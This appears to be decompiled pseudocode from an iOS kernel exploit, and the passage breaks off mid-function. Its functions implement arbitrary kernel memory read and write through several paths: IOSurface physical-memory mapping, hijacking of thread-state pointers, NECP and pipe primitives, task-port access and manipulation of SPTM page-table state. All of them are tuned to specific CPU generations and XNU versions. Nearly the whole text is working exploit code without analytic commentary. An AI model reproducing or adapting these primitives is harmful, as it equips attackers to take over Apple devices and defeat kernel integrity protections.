//----- (0000000000028CE0) ----------------------------------------------------
unsigned __int64 __fastcall find_sptm_pgtable_state_block(struct_krwCtx *krwCtx, unsigned __int64 a2, __int64 a3)
{
  struct
  {
    uint8_t unused[32];
    uint64_t paddr;
  } walk = {0};

  if ( !pgtable_walk_full(krwCtx, a2, (__int64)&walk, a3).n128_u64[0] )
    return 0;
  return (krwCtx->pageMask & a2) | (walk.paddr & 0xFFFFFFFFC000LL);
}

//----- (0000000000028D44) ----------------------------------------------------
__int64 __fastcall teardown_sptm_pgtable_state(struct_krwCtx *krwCtx)
{
  uint64_t *state = (uint64_t *)krwCtx->IOKitConnInfo;
  if ( !state )
    return 708609;

  if ( state[2] && state[3] )
  {
    vm_deallocate(mach_task_self_, state[2], state[3]);
    state[2] = 0;
    state[3] = 0;
    state = (uint64_t *)krwCtx->IOKitConnInfo;
    if ( !state )
      return 708609;
  }

  krwCtx->IOKitConnInfo = 0;
  *((uint8_t *)state + 72) = 1;
  __ulock_wake(0x201u, (void *)((char *)state + 52), *((uint32_t *)state + 12));
  pthread_join((pthread_t)state[5], 0);
  memset(state, 0, 0x78u);
  free(state);
  return 0;
}

//----- (0000000000028DFC) ----------------------------------------------------
bool __fastcall noppl_kwrite32(struct_krwCtx *krwCtx, mach_vm_address_t address, int a3)
{
  __int64 (__fastcall *customKwrite)(struct_krwCtx *, mach_vm_address_t, int *, __int64, __int64);
  int newValue = a3;
  int rawStatus;

  customKwrite = (__int64 (__fastcall *)(struct_krwCtx *, mach_vm_address_t, int *, __int64, __int64))krwCtx->iogpuKwriteFn;
  if ( customKwrite )
    return customKwrite(krwCtx, address, &newValue, 4, 1) == 0;

  if ( (unsigned int)(krwCtx->threadForKernelRead + 1) >= 2 && krwCtx->threadStateKrwPhysAddr )
  {
    rawStatus = iosurface_physmap_kwrite(krwCtx, address, (__int64)&newValue, 4u, 1);
  }
  else if ( (unsigned int)(krwCtx->ioConnectPort + 1) >= 2 && krwCtx->ioConnectMappedAddr && krwCtx->ioConnectMappedSize )
  {
    rawStatus = ioconnect_callmethod_write(krwCtx, address, (__int64)&newValue, 4u, 1);
  }
  else if ( krwCtx->krw_pipe_0 != -1
         && krwCtx->krw_pipe_1 != -1
         && krwCtx->iosurfaceFd_size4 != -1
         && krwCtx->gap_0x218 )
  {
    rawStatus = necp_ioconnect_krw(krwCtx, address, (__int64)&newValue, 4u, 1);
  }
  else if ( krwCtx->krw_pipe_0 != -1
         && krwCtx->krw_pipe_1 != -1
         && krwCtx->pipeFd0 != -1
         && krwCtx->pipeFd1 != -1 )
  {
    rawStatus = pipe_pair_krw(krwCtx, address, &newValue, 4u, 1);
  }
  else
  {
    vm_machine_attribute_val_t value = 7;
    kern_return_t kr = mach_vm_write(krwCtx->targetVmPort, address, (vm_offset_t)&newValue, 4u);
    mach_vm_machine_attribute(krwCtx->targetVmPort, address, 4u, 1u, &value);
    return kr == 0;
  }

  return rawStatus == 0;
}

static uint64_t iosurface_physmap_cpu_state_offset(struct_krwCtx *krwCtx)
{
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A17) )
    return 224;
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A11_TO_A17_OR_SELF_TASK_PORT_MASK) )
    return 144;
  return 216;
}

static __int64 iosurface_physmap_wait_for_helper(uint64_t iokitState)
{
  uint64_t oldGeneration = *(uint64_t *)(iokitState + 64);
  if ( __ulock_wake(0x201u, (void *)(iokitState + 52), *(uint32_t *)(iokitState + 48)) )
  {
    int err = errno;
    if ( err < 0 )
      err = -err;
    return err | 0x40000000u;
  }

  if ( oldGeneration != *(uint64_t *)(iokitState + 64) )
    return 0;

  for ( uint32_t attempt = 0; attempt != 1001; ++attempt )
  {
    thread_switch(*(uint32_t *)(iokitState + 48), 2, attempt > 8);
    if ( oldGeneration != *(uint64_t *)(iokitState + 64) )
      return 0;
  }
  return 4097;
}

static __int64 iosurface_physmap_kwrite_unaligned(
        struct_krwCtx *krwCtx,
        uint64_t vaddr,
        __int64 inBuf,
        uint32_t size,
        int openDevNull)
{
  __int64 status = 708609;
  int fd = -1;

  if ( krwCtx->threadForKernelRead + 1 < 2 || !krwCtx->threadStateKrwPhysAddr )
    return status;
  if ( !check_kaddr_in_physmap(krwCtx, vaddr) )
    return status;

  if ( openDevNull )
  {
    status = fd_open_dev_null(&fd);
    if ( (uint32_t)status )
      return status;
  }

  uint32_t offset = 0;
  while ( offset < size )
  {
    uint64_t currentVaddr = vaddr + offset;
    uint64_t byteOffset = currentVaddr & 7;
    uint64_t alignedVaddr = currentVaddr - byteOffset;
    uint64_t mergedValue = 0;
    status = kreadbuf_via_dev_null_and_thread_state(krwCtx, alignedVaddr, (__int64)&mergedValue, 8u, 0);
    if ( (uint32_t)status )
    {
      TRACE_PORTS("iosurface_physmap_kwrite unaligned read failed raw=%x aligned=%llx off=%llx\n",
                  (unsigned int)status,
                  (unsigned long long)alignedVaddr,
                  (unsigned long long)byteOffset);
      break;
    }

    size_t bytesThisWord = 8 - byteOffset >= (uint64_t)(size - offset) ? size - offset : 8 - byteOffset;
    uint64_t oldValue = mergedValue;
    memcpy((char *)&mergedValue + byteOffset, (const void *)(inBuf + offset), bytesThisWord);
    if ( oldValue != mergedValue )
    {
      status = ioconnect_struct_method_kwrite(krwCtx, alignedVaddr, mergedValue);
      if ( (uint32_t)status )
      {
        TRACE_PORTS("iosurface_physmap_kwrite unaligned write failed raw=%x aligned=%llx value=%llx\n",
                    (unsigned int)status,
                    (unsigned long long)alignedVaddr,
                    (unsigned long long)mergedValue);
        break;
      }
    }

    offset = offset - byteOffset + 8;
  }

  if ( offset >= size )
    status = 0;
  if ( fd != -1 )
    fd_close(fd);
  return status;
}

//----- (0000000000028F90) ----------------------------------------------------
__int64 __fastcall iosurface_physmap_kwrite(struct_krwCtx *krwCtx, unsigned __int64 a2, __int64 a3, unsigned int a4, int a5)
{
  __int64 status = 708609;
  uint64_t IOKitConnInfo = krwCtx->IOKitConnInfo;

  if ( !IOKitConnInfo )
  {
    TRACE_PORTS("iosurface_physmap_kwrite no state ctx=%llx addr=%llx size=%u\n",
                (unsigned long long)krwCtx,
                (unsigned long long)a2,
                a4);
    return status;
  }

  TRACE_PORTS("iosurface_physmap_kwrite enter ctx=%llx addr=%llx buf=%llx size=%u a5=%d state=%llx flags=%x byte4a=%u thread=%d ptr=%llx\n",
              (unsigned long long)krwCtx,
              (unsigned long long)a2,
              (unsigned long long)a3,
              a4,
              a5,
              (unsigned long long)IOKitConnInfo,
              krwCtx->flags,
              *(unsigned __int8 *)(IOKitConnInfo + 74),
              krwCtx->threadForKernelRead,
              (unsigned long long)krwCtx->threadStateKrwPhysAddr);

  if ( ((a2 & 3) != 0 || a4 != 4) && *(uint8_t *)(IOKitConnInfo + 74) )
  {
    status = iosurface_physmap_kwrite_unaligned(krwCtx, a2, a3, a4, a5);
    TRACE_PORTS("iosurface_physmap_kwrite exit raw=%llx\n", (unsigned long long)status);
    return status;
  }

  if ( !check_kaddr_in_physmap(krwCtx, a2) )
  {
    TRACE_PORTS("iosurface_physmap_kwrite validate failed addr=%llx\n", (unsigned long long)a2);
    return status;
  }

  int fd = -1;
  if ( a5 )
  {
    status = fd_open_dev_null(&fd);
    if ( (uint32_t)status )
      return status;
  }

  uint32_t offset = 0;
  while ( offset < a4 )
  {
    uint32_t remaining = a4 - offset;
    uint64_t currentVaddr = a2 + offset;
    uint32_t prepad = 0;
    if ( remaining < 4 && (((currentVaddr + remaining - 1) ^ (currentVaddr + 3)) & ~krwCtx->pageMask) != 0 )
      prepad = 4 - remaining;

    uint64_t writeBase = currentVaddr - prepad;
    int oldWord = 0;
    status = kreadbuf_via_dev_null_and_thread_state(krwCtx, writeBase, (__int64)&oldWord, 4u, 0);
    if ( (uint32_t)status )
    {
      TRACE_PORTS("iosurface_physmap_kwrite pre-read failed raw=%llx addr=%llx base=%llx\n",
                  (unsigned long long)status,
                  (unsigned long long)currentVaddr,
                  (unsigned long long)writeBase);
      break;
    }

    size_t bytesToPatch = 4 - (uint64_t)prepad >= remaining ? remaining : 4 - prepad;
    int patchedWord = oldWord;
    memcpy((char *)&patchedWord + prepad, (const void *)(a3 + offset), bytesToPatch);
    if ( oldWord == patchedWord )
    {
      offset = offset - prepad + 4;
      continue;
    }

    TRACE_PORTS("iosurface_physmap_kwrite aligned chunk addr=%llx base=%llx old=%x new=%x off=%u left=%llu\n",
                (unsigned long long)currentVaddr,
                (unsigned long long)writeBase,
                oldWord,
                patchedWord,
                prepad,
                (unsigned long long)remaining);

    uint64_t targetWriteBase = writeBase;
    vm_address_t mappedAddress = 0;
    vm_size_t mappedSize = vm_page_size;
    uint64_t state = krwCtx->IOKitConnInfo;
    status = 708609;
    if ( !state )
    {
      TRACE_PORTS("iosurface_physmap_kwrite missing IOKitConnInfo during chunk\n");
      goto chunk_cleanup;
    }

    uint32_t stateIndex = *(uint32_t *)(state + 56);
    if ( !stateIndex )
    {
      TRACE_PORTS("iosurface_physmap_kwrite missing state[56]\n");
      goto chunk_cleanup;
    }

    uint64_t sharedStateBase = *(uint64_t *)(state + 8);
    if ( !sharedStateBase )
    {
      TRACE_PORTS("iosurface_physmap_kwrite missing state[8]\n");
      goto chunk_cleanup;
    }

    uint64_t stateEntryOffset = (uint32_t)(stateIndex + 96);
    uint64_t stateEntryKaddr = sharedStateBase + stateEntryOffset;
    uint64_t perCpuStateKaddr = sharedStateBase + iosurface_physmap_cpu_state_offset(krwCtx);
    uint64_t *stateEntrySlot = (uint64_t *)(*(uint64_t *)(state + 32) + stateEntryOffset);
    bool newPacLayout = krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(10002, 60, 75, 0, 2)
                     && (krwCtx->flags & KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) != 0;

    status = 163878;
    for ( int attempt = 11; attempt; --attempt )
    {
      uint64_t stateAddrA = 0;
      uint64_t stateAddrB = 0;

      if ( attempt != 11 )
        thread_switch(*(uint32_t *)(state + 48), 2, 0xAu);

      if ( newPacLayout )
      {
        status = read_via_mapped_physmem_region(krwCtx, stateEntryKaddr, &stateAddrA, krwCtx->stride_0x168, 0);
        if ( (uint32_t)status )
          break;
        if ( !validate_kaddr_range(krwCtx, stateAddrA) )
          continue;
        status = read_via_mapped_physmem_region(krwCtx, perCpuStateKaddr, &stateAddrB, krwCtx->stride_0x168, 0);
        if ( (uint32_t)status )
          break;
      }
      else
      {
        stateAddrA = *stateEntrySlot;
        if ( !validate_kaddr_range(krwCtx, stateAddrA) )
          continue;
        stateAddrB = *(uint64_t *)(*(uint64_t *)(state + 32) + iosurface_physmap_cpu_state_offset(krwCtx));
      }

      if ( stateAddrA != stateAddrB )
        continue;

      uint64_t paddr = find_sptm_pgtable_state_block(krwCtx, stateAddrB, 0);
      if ( !paddr )
      {
        status = 163878;
        break;
      }

      if ( newPacLayout )
      {
        int stateWord = 0;
        status = read_via_mapped_physmem_region(krwCtx, paddr + 52, &stateWord, 4u, 0);
        if ( (uint32_t)status )
          break;
        if ( stateWord != 1 )
        {
          status = 163857;
          break;
        }

        int mode;
        if ( patchedWord )
        {
          stateWord = patchedWord + 1;
          status = physwritebuf_direct_mapped(krwCtx, paddr + 52, &stateWord, 4u, 0);
          if ( (uint32_t)status )
            break;
          mode = 1;
        }
        else
        {
          mode = 2;
        }

        status = physwritebuf_direct_mapped(krwCtx, paddr + 56, &mode, 4u, 0);
        if ( (uint32_t)status )
          break;
        status = physwritebuf_direct_mapped(krwCtx, stateEntryKaddr + 24, &targetWriteBase, krwCtx->stride_0x168, 0);
        if ( (uint32_t)status )
          break;
      }
      else
      {
        status = physmap_maybe(krwCtx, &mappedAddress, mappedSize, paddr);
        if ( (uint32_t)status )
          break;

        uint64_t mappedState = (krwCtx->pageMask & stateAddrA) + mappedAddress;
        int stateWord = *(uint32_t *)(mappedState + 52);
        if ( stateWord != 1 )
        {
          status = 163857;
          break;
        }

        int mode;
        if ( patchedWord )
        {
          *(uint32_t *)(mappedState + 52) = patchedWord + 1;
          mode = 1;
        }
        else
        {
          mode = 2;
        }
        *(uint32_t *)(mappedState + 56) = mode;
        stateEntrySlot[3] = targetWriteBase;
      }

      status = iosurface_physmap_wait_for_helper(state);
      break;
    }

chunk_cleanup:
    TRACE_PORTS("iosurface_physmap_kwrite chunk cleanup err=%llx addr=%llx physmap=%llx\n",
                (unsigned long long)status,
                (unsigned long long)writeBase,
                (unsigned long long)mappedAddress);
    if ( mappedAddress && mappedSize )
      vm_deallocate(mach_task_self_, mappedAddress, mappedSize);
    if ( (uint32_t)status )
      break;

    offset = offset - prepad + 4;
  }

  if ( offset >= a4 )
    status = 0;
  if ( fd != -1 )
    fd_close(fd);
  TRACE_PORTS("iosurface_physmap_kwrite exit raw=%llx\n", (unsigned long long)status);
  return status;
}

//----- (00000000000295B4) ----------------------------------------------------
bool __fastcall kread_u32(struct_krwCtx *krwCtx, unsigned __int64 vaddr, void *outBuf)
{
  __int64 (__fastcall *customKread)(struct_krwCtx *, unsigned __int64, void *, unsigned int, __int64);
  int rawStatus;
  uint64_t bytesRead = 0;

  krwCtx = KRWCTX_FROM_UINTPTR(krwCtx);

  customKread = (__int64 (__fastcall *)(struct_krwCtx *, unsigned __int64, void *, unsigned int, __int64))krwCtx->iogpuKreadFn;
  if ( customKread )
    return customKread(krwCtx, vaddr, outBuf, 4, 1) == 0;

  if ( (unsigned int)(krwCtx->threadForKernelRead + 1) >= 2 && krwCtx->threadStateKrwPhysAddr )
  {
    rawStatus = kreadbuf_via_dev_null_and_thread_state(krwCtx, vaddr, (__int64)outBuf, 4u, 1);
  }
  else if ( (unsigned int)(krwCtx->ioConnectPort + 1) >= 2 && krwCtx->ioConnectMappedAddr && krwCtx->ioConnectMappedSize )
  {
    rawStatus = kreadbuf_via_IOConnectCallMethod(krwCtx, vaddr, (__int64)outBuf, 4u, 1);
  }
  else if ( krwCtx->krw_pipe_0 != -1
         && krwCtx->krw_pipe_1 != -1
         && krwCtx->iosurfaceFd != -1
         && krwCtx->gap_0x218 )
  {
    rawStatus = kreadbuf_via_dev_null_only(krwCtx, vaddr, (__int64)outBuf, 4u, 1);
  }
  else if ( krwCtx->krw_pipe_0 != -1
         && krwCtx->krw_pipe_1 != -1
         && krwCtx->pipeFd0 != -1
         && krwCtx->pipeFd1 != -1 )
  {
    rawStatus = kreadbuf_via_dev_null_simple(krwCtx, vaddr, outBuf, 4u, 1);
  }
  else
  {
    return kreadbuf_via_tfp0(krwCtx->targetVmPort, vaddr, 4u, krwCtx->vmMapSize, (__int64)outBuf, &bytesRead) == 0;
  }

  return rawStatus == 0;
}

//----- (00000000000296E8) ----------------------------------------------------
__int64 __fastcall kreadbuf_via_dev_null_and_thread_state(
        struct_krwCtx *krwCtx,
        unsigned __int64 vaddr,
        __int64 outBuf,
        unsigned int size,
        int a5)
{
  natural_t threadState[134];
  int fd = -1;
  __int64 status = 0xAD001;

  if ( krwCtx->threadForKernelRead + 1 < 2 || !krwCtx->threadStateKrwPhysAddr )
    return status;
  if ( !check_kaddr_in_physmap(krwCtx, vaddr) )
    return status;

  if ( a5 )
  {
    status = fd_open_dev_null(&fd);
    if ( (uint32_t)status )
      return status;
  }

  uint32_t offset = 0;
  while ( offset < size )
  {
    uint32_t remaining = size - offset;
    uint64_t currentVaddr = vaddr + offset;
    uint32_t chunkSize;

    if ( (krwCtx->pageMask & currentVaddr) == 0 && remaining >= 0x4000 && krw_ctx_has_read_caps(krwCtx) )
    {
      uint64_t xnuVersionPacked = krwCtx->xnuVersionPacked;
      uint32_t maxChunk = xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) ? 0x4000 : 0x80000;
      if ( xnuVersionPacked > XNU_VERSION_PACKED(10001, 1023, 1023, 1023, 1023) )
        maxChunk = 528;

      chunkSize = remaining >= maxChunk ? maxChunk : remaining;
      status = necp_semaphore_kread(krwCtx, currentVaddr, (char *)(outBuf + offset), chunkSize);
      if ( (uint32_t)status )
        break;
      offset += chunkSize;
      continue;
    }

    chunkSize = remaining >= 528 ? 528 : remaining;
    if ( krwCtx->threadForKernelRead + 1 < 2 || !krwCtx->threadStateKrwPhysAddr )
    {
      status = 708609;
      break;
    }

    uint32_t chunkOffset = 0;
    while ( chunkOffset < chunkSize )
    {
      uint64_t readVaddr = currentVaddr + chunkOffset;
      uint32_t bytesLeftInChunk = chunkSize - chunkOffset;
      size_t bytesCopied = 0;

      if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(10002, 60, 75, 0, 3)
        && (krwCtx->flags & KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) != 0 )
      {
        uint64_t pageMask = krwCtx->pageMask;
        uint64_t pageWindowOffset = pageMask & readVaddr;
        uint64_t maxWindowOffset = (uint32_t)krwCtx->pageSizeOrSomething - 528LL;
        uint64_t savedThreadStatePtr = 0;
        mach_msg_type_number_t stateCount = 132;

        if ( pageWindowOffset >= maxWindowOffset )
          pageWindowOffset = maxWindowOffset;

        if ( validate_kaddr_range(krwCtx, krwCtx->threadStateSavedPtr) )
        {
          savedThreadStatePtr = krwCtx->threadStateSavedPtr;
        }
        else
        {
          status = read_via_mapped_physmem_region(krwCtx, krwCtx->threadStateKrwPhysAddr, &savedThreadStatePtr, 8u, 0);
          if ( (uint32_t)status )
            break;
          krwCtx->threadStateSavedPtr = savedThreadStatePtr;
        }

        uint64_t threadStateWindow = (readVaddr & ~pageMask) + pageWindowOffset;
        uint64_t patchedThreadStatePtr = threadStateWindow - 16;
        __dsb(0xBu);

        status = physwritebuf_direct_mapped(krwCtx, krwCtx->threadStateKrwPhysAddr, &patchedThreadStatePtr, 8u, 0);
        if ( !(uint32_t)status )
        {
          uint32_t readStatus = 0;
          kern_return_t kr = thread_get_state(krwCtx->threadForKernelRead, 0x11, threadState, &stateCount);
          if ( kr )
          {
            readStatus = kr | 0x80000000;
          }
          else if ( stateCount == 132 )
          {
            uint64_t windowBytesLeft = threadStateWindow - readVaddr + 528;
            bytesCopied = windowBytesLeft <= bytesLeftInChunk ? windowBytesLeft : bytesLeftInChunk;
            memcpy((void *)(outBuf + offset + chunkOffset), (char *)threadState + readVaddr - threadStateWindow, bytesCopied);
          }
          else
          {
            readStatus = 708642;
          }

          uint32_t restoreStatus = physwritebuf_direct_mapped(krwCtx, krwCtx->threadStateKrwPhysAddr, &savedThreadStatePtr, 8u, 0);
          status = restoreStatus ? (readStatus ? readStatus : restoreStatus) : readStatus;
        }
      }
      else
      {
        mach_msg_type_number_t stateCount = 132;
        uint64_t pageMask = krwCtx->pageMask;
        uint64_t pageBase = readVaddr & ~pageMask;
        uint64_t pageWindowOffset = pageMask & readVaddr;
        uint64_t maxWindowOffset = (uint32_t)krwCtx->pageSizeOrSomething - 528LL;

        if ( pageWindowOffset >= maxWindowOffset )
          pageWindowOffset = maxWindowOffset;

        uint64_t threadStateWindow = pageBase + pageWindowOffset;
        uint64_t *mappedThreadStatePtr = (uint64_t *)krwCtx->threadStateMappedPtr;
        uint64_t savedThreadStatePtr = *mappedThreadStatePtr;
        __dsb(0xBu);
        *mappedThreadStatePtr = threadStateWindow - 16;

        kern_return_t kr = thread_get_state(krwCtx->threadForKernelRead, 17, threadState, &stateCount);
        if ( kr )
        {
          status = kr | 0x80000000;
        }
        else if ( stateCount == 132 )
        {
          uint64_t windowBytesLeft = threadStateWindow - readVaddr + 528;
          bytesCopied = windowBytesLeft <= bytesLeftInChunk ? windowBytesLeft : bytesLeftInChunk;
          memcpy((void *)(outBuf + offset + chunkOffset), (char *)threadState + readVaddr - threadStateWindow, bytesCopied);
          status = 0;
        }
        else
        {
          status = 708642;
        }

        *mappedThreadStatePtr = savedThreadStatePtr;
      }

      if ( (uint32_t)status )
        break;
      chunkOffset += bytesCopied;
    }

    if ( (uint32_t)status )
      break;
    offset += chunkSize;
  }

  if ( offset >= size )
    status = 0;
  if ( fd != -1 )
    fd_close(fd);
  return status;
}

//----- (0000000000029AD0) ----------------------------------------------------
__int64 __fastcall kreadbuf_via_tfp0(
        vm_map_read_t target_task,
        __int64 vaddr,
        mach_vm_size_t size,
        mach_vm_size_t size2,
        __int64 outBuf,
        uint64_t *a6)
{
  if ( !size )
    return 4;

  mach_vm_size_t remaining = size;
  mach_vm_size_t chunkLimit = size2 ? size2 : size;
  uint32_t copied = 0;
  while ( remaining )
  {
    mach_vm_size_t outsize = remaining;
    mach_vm_size_t chunkSize = remaining >= chunkLimit ? chunkLimit : remaining;
    kern_return_t kr = mach_vm_read_overwrite(target_task, vaddr + copied, chunkSize, outBuf + copied, &outsize);
    if ( kr )
      return kr;

    copied = (uint32_t)(copied + outsize);
    remaining -= outsize;
  }

  if ( a6 )
    *a6 = copied;
  return 0;
}

//----- (0000000000029B78) ----------------------------------------------------
bool __fastcall kread64_internal(struct_krwCtx *krwCtx, unsigned __int64 a2, uint64_t *a3)
{
  __int64 (__fastcall *customKread)(struct_krwCtx *, unsigned __int64, uint64_t *, uint64_t, __int64);
  int rawStatus;
  uint64_t bytesRead = 0;

  *a3 = 0;

  customKread = *(__int64 (__fastcall **)(struct_krwCtx *, unsigned __int64, uint64_t *, uint64_t, __int64))&krwCtx->iogpuKreadFn;
  if ( customKread )
    return customKread(krwCtx, a2, a3, (unsigned int)krwCtx->stride_0x168, 1) == 0;

  if ( krwCtx->threadForKernelRead + 1 >= 2 && *(uint64_t *)&krwCtx->threadStateKrwPhysAddr )
  {
    rawStatus = kreadbuf_via_dev_null_and_thread_state(krwCtx, a2, (__int64)a3, krwCtx->stride_0x168, 1);
  }
  else if ( (unsigned int)(*(uint32_t *)&krwCtx->ioConnectPort + 1) >= 2 && *(uint64_t *)&krwCtx->ioConnectMappedAddr && *(uint64_t *)&krwCtx->ioConnectMappedSize )
  {
    rawStatus = kreadbuf_via_IOConnectCallMethod(krwCtx, a2, (__int64)a3, krwCtx->stride_0x168, 1);
  }
  else if ( krwCtx->krw_pipe_0 != -1
         && krwCtx->krw_pipe_1 != -1
         && krwCtx->iosurfaceFd != -1
         && krwCtx->gap_0x218 )
  {
    rawStatus = kreadbuf_via_dev_null_only(krwCtx, a2, (__int64)a3, krwCtx->stride_0x168, 1);
  }
  else if ( krwCtx->krw_pipe_0 != -1
         && krwCtx->krw_pipe_1 != -1
         && krwCtx->pipeFd0 != -1
         && krwCtx->pipeFd1 != -1 )
  {
    rawStatus = kreadbuf_via_dev_null_simple(krwCtx, a2, a3, krwCtx->stride_0x168, 1);
  }
  else
  {
    return kreadbuf_via_tfp0(
             krwCtx->targetAndParentTaskPorts,
             a2,
             krwCtx->stride_0x168,
             (unsigned int)krwCtx->vmMapSize,
             (__int64)a3,
             &bytesRead) == 0;
  }

  return rawStatus == 0;
}

//----- (0000000000029CB0) ----------------------------------------------------
unsigned __int64 __fastcall maybe_sptm_translate_kaddr(struct_krwCtx *krwCtx, __int64 a2)
{
  if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) || (krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) == 0 )
    return a2;
  return krw_xpac_vaddr(krwCtx, a2);
}

//----- (0000000000029D2C) ----------------------------------------------------
unsigned __int64 __fastcall krw_xpac_vaddr_if_needed(struct_krwCtx *krwCtx, __int64 a2)
{
  if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) )
    return a2;
  return krw_xpac_vaddr(krwCtx, a2);
}

//----- (0000000000029D88) ----------------------------------------------------
unsigned __int64 __fastcall krw_xpac_vaddr(struct_krwCtx *krwCtx, __int64 a2)
{
  uint64_t vaddr = a2;
  if ( vaddr && (vaddr & 0x80000000000000LL) != 0 )
  {
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_HIGH_CORE_CLUSTER)
      || (krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A16_A17_MASK)
       && krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(8792, 40, 108, 0, 0)) )
      return vaddr | 0xFFFF800000000000LL;
    return vaddr | 0xFFFFFF8000000000LL;
  }
  return vaddr;
}

//----- (0000000000029DF8) ----------------------------------------------------
bool __fastcall this_is_the_kwrite64(struct_krwCtx *krwCtx, mach_vm_address_t address, __int64 newValue, int whatIsThis)
{
  __int64 (__fastcall *customKwrite)(struct_krwCtx *, mach_vm_address_t, __int64 *, uint64_t, __int64);
  __int64 writeValue = newValue;
  int rawStatus;

  customKwrite = (__int64 (__fastcall *)(struct_krwCtx *, mach_vm_address_t, __int64 *, uint64_t, __int64))krwCtx->iogpuKwriteFn;
  if ( customKwrite )
    return customKwrite(krwCtx, address, &writeValue, krwCtx->stride_0x168, 1) == 0;

  if ( (unsigned int)(krwCtx->threadForKernelRead + 1) >= 2 && krwCtx->threadStateKrwPhysAddr )
  {
    if ( !krwCtx->IOKitConnInfo )
      return false;
    return iosurface_physmap_kwrite(krwCtx, address, (__int64)&writeValue, krwCtx->stride_0x168, 1) == 0;
  }

  if ( (unsigned int)(krwCtx->ioConnectPort + 1) >= 2 && krwCtx->ioConnectMappedAddr && krwCtx->ioConnectMappedSize )
    return ioconnect_callmethod_write(krwCtx, address, (__int64)&writeValue, krwCtx->stride_0x168, 1) == 0;

  if ( krwCtx->krw_pipe_0 == -1 || krwCtx->krw_pipe_1 == -1 )
  {
    vm_machine_attribute_val_t value = 7;
    kern_return_t kr = mach_vm_write(krwCtx->targetVmPort, address, (vm_offset_t)&writeValue, krwCtx->stride_0x168);
    mach_vm_machine_attribute(krwCtx->targetVmPort, address, krwCtx->stride_0x168, 1u, &value);
    return kr == 0;
  }

  if ( krwCtx->iosurfaceFd_size4 == -1 || !krwCtx->gap_0x218 )
  {
    if ( krwCtx->pipeFd0 != -1 && krwCtx->pipeFd1 != -1 )
      return pipe_pair_krw(krwCtx, address, &writeValue, krwCtx->stride_0x168, 1) == 0;

    vm_machine_attribute_val_t value = 7;
    kern_return_t kr = mach_vm_write(krwCtx->targetVmPort, address, (vm_offset_t)&writeValue, krwCtx->stride_0x168);
    mach_vm_machine_attribute(krwCtx->targetVmPort, address, krwCtx->stride_0x168, 1u, &value);
    return kr == 0;
  }

  if ( !whatIsThis )
    return necp_ioconnect_krw(krwCtx, address, (__int64)&writeValue, krwCtx->stride_0x168, 1) == 0;

  rawStatus = acquire_write_semaphore_lock(krwCtx, 1u, 0x2710u);
  if ( rawStatus )
    return false;

  if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8019, 0, 0, 0, 0) )
  {
    rawStatus = necp_ioservice_auth_write(krwCtx, address);
  }
  else
  {
    uint64_t helper = krwCtx->semaphoreHelperCtx;
    rawStatus = 708609;
    if ( helper )
    {
      semaphore_t requestSemaphore = *(uint32_t *)(helper + 8);
      semaphore_t replySemaphore = *(uint32_t *)(helper + 12);
      if ( requestSemaphore + 1 >= 2 && replySemaphore + 1 >= 2 )
      {
        uint64_t *helperAddress = (uint64_t *)(helper + 32);
        *(uint64_t *)(helper + 32) = address;
        *(uint64_t *)(helper + 40) = (uint64_t)&writeValue;
        *(uint64_t *)(helper + 48) = 8;

        kern_return_t signalStatus = semaphore_signal(requestSemaphore);
        if ( signalStatus )
        {
          rawStatus = signalStatus | 0x80000000;
        }
        else
        {
          kern_return_t waitStatus = semaphore_timedwait(replySemaphore, IDA_MACH_TIMESPEC(3ULL));
          rawStatus = *(uint32_t *)(helper + 60);
          if ( !rawStatus )
            rawStatus = waitStatus ? waitStatus | 0x80000000 : 0;
        }

        *helperAddress = 0;
        *(uint64_t *)(helper + 40) = 0;
        *(uint64_t *)(helper + 48) = 0;
        if ( *(uint32_t *)(helper + 60) )
          teardown_semaphore_helper_ctx(krwCtx, 0);
      }
    }
  }

  int mappedRegionStatus = 708616;
  if ( krwCtx->mappedKernelRegion && krwCtx->mappedKernelSize )
  {
    mappedRegionStatus = 0;
    atomic_store(0, (unsigned __int8 *)(krwCtx->mappedKernelRegion + 1));
  }

  return (rawStatus ? rawStatus : mappedRegionStatus) == 0;
}

//----- (000000000002A0D0) ----------------------------------------------------
bool __fastcall kwrite64(struct_krwCtx *krwCtx, mach_vm_address_t a2, __int64 a3)
{
  return kwrite64_last_arg(krwCtx, a2, a3, krwCtx->gap_0xC);
}

//----- (000000000002A0D8) ----------------------------------------------------
__int64 __fastcall pgtable_walk_and_physmap_remap(struct_krwCtx *krwCtx, __int64 a2, __int64 a3)
{
  struct
  {
    uint8_t unused[32];
    uint64_t paddr;
  } walk = {0};
  struct
  {
    uint64_t mappedAddress;
    uint8_t rest[48];
  } mapping = {0};

  if ( !pgtable_walk_wrapper(krwCtx, a2 & ~krwCtx->pageMask, &walk) )
    return 0;

  if ( physmap_map_cached(krwCtx, walk.paddr & 0xFFFFFFFFC000LL, (__int64)&mapping) )
  {
    if ( mapping.mappedAddress )
      physmap_unmap_cached(krwCtx, (__int64)&mapping);
    return 0;
  }

  *(uint64_t *)((krwCtx->pageMask & a2) + mapping.mappedAddress) = a3;
  if ( mapping.mappedAddress )
    physmap_unmap_cached(krwCtx, (__int64)&mapping);
  return 1;
}

//----- (000000000002A188) ----------------------------------------------------
__int64 __fastcall kwritebuf_last_arg_1(struct_krwCtx *krwCtx, __int64 address, const void *buf, mach_vm_size_t bufSize)
{
  return noppl_kwritebuf(krwCtx, address, buf, bufSize, 1);
}

//----- (000000000002A190) ----------------------------------------------------
unsigned __int64 __fastcall port_right_index_to_kaddr(struct_krwCtx *krwCtx, unsigned int a2)
{
  if ( !a2 )
    return 0;

  if ( (a2 & 0x80000000) != 0 )
  {
